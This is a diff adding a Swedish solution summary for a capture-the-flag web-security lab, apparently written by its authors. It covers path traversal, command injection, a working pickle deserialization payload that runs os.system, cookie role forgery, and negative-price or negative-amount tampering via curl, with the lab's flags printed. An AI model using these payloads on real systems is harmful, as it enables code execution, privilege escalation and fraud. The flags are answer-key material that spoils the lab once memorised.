@@ -1,0 +1,112 @@
+ Sammanfattning av stegen på path traversal
+Testa nu så här:
+
+1️⃣ ls → Ser att flags/ finns
+2️⃣ ls flags → Ser att sacred_command.txt finns
+3️⃣ cat flags/sacred_command.txt
+
+--------------------------------------------------
+Sammanfattning av stgen på OS command injection
+
+Lista root-katalogen för att hitta /flags/ → ls /
+Lista /flags/ för att se om flaggfiler finns → ls /flags
+Läs flaggfilen med cat → cat /flags/sacred_command.txt
+
+ Nu är labben komplett och lätt att förstå!
+
+------------------------------------------------------
+Sammanfattning av steg på  Insecure Deserialization
+
+Besök sidan på http://localhost:5000/canopic_jar.
+Skapa en payload i Python med pickle och base64.
+Skicka payloaden via inputfältet på webbsidan.
+Servern deserialiserar datan och kör kommandot.
+Flaggan visas! 
+--------------------------------------------------------
+payloaden : 
+import pickle
+import base64
+import os
+
+# Skapa en exploitklass
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ("cat /flags/soul_of_osiris.txt",))
+
+# Serialisera objektet
+exploit = pickle.dumps(Exploit())
+
+# Konvertera till Base64 för att skicka via webben
+payload = base64.b64encode(exploit).decode()
+print(payload)
+
+Eller curl -X GET http://172.18.0.2:5000/canopic_jar
+----------------------------------------------------------
+Sammanfattning client side exploit
+
+Webbplatsen litar på klientens inmatning (ingen servervalidering).
+Vi ändrar priset till ett negativt värde → Flaggan ges som belöning!
+Exploit fungerar via både DevTools och en POST-request.
+
+Metod 1: Manipulera HTML i webbinspektören
+
+    Öppna DevTools (Högerklicka → "Inspektera element" eller F12).
+    Leta upp HTML-koden för prisinputfältet:
+
+<input type="text" id="price" name="price" value="100">
+
+Ändra värdet till ett negativt tal:
+
+<input type="text" id="price" name="price" value="-1000">
+
+Tryck på "Buy" och skicka formuläret.
+Om exploiten fungerar får du flaggan:
+
+     You exploited the system! Flag: O24{market_of_hatshepsut_welcomes_the_shadow_trader}
+
+Alternativ: Skicka en manipulerad request
+
+Om du vill använda Burp Suite eller cURL, gör så här:
+ Metod 2: cURL
+
+Skicka en POST-request med negativt pris:
+
+curl -X POST -d "price=-1000" http://localhost:5000/store/buy
+
+Får du flaggan i svaret? Då har du klarat labben!
+
+ Labben är redo att användas i en CTF! Testa själv och se om det funkar!
+
+ ----------------------------------------------------------------------
+
+ Sammanfattning av Broken Access Control
+
+Mål: Bli admin genom att manipulera cookies.
+Metod 1: Manipulera cookies i DevTools
+
+Öppna DevTools (F12) → Fliken "Application".
+Navigera till "Cookies" → localhost.
+Ändra cookien role från user till admin.
+Ladda om sidan /admin och få flaggan:
+
+ You have accessed the sacred chamber! Flag: O24{duat_barriers_fall_as_the_false_pharaoh_rises}
+
+Metod 2: Skicka en request via cURL
+
+curl -X GET http://localhost:5000/admin --cookie "role=admin"
+
+--------------------------------------------------------------
+
+Sammanfattning av Infinite Money Exploit
+
+Mål: Få obegränsat med pengar genom att ange ett negativt belopp.
+Metod 1: Manipulera fältet i DevTools
+
+    Inspektera input-fältet och ändra värdet till -1000.
+    Skicka formuläret och få flaggan!
+
+    You exploited the banking system! Flag: O24{golden_sands_of_atum_create_wealth_without_end}
+
+Metod 2: Skicka en request via cURL
+
+curl -X POST -d "amount=-1000" http://localhost:5000/bank/transfer
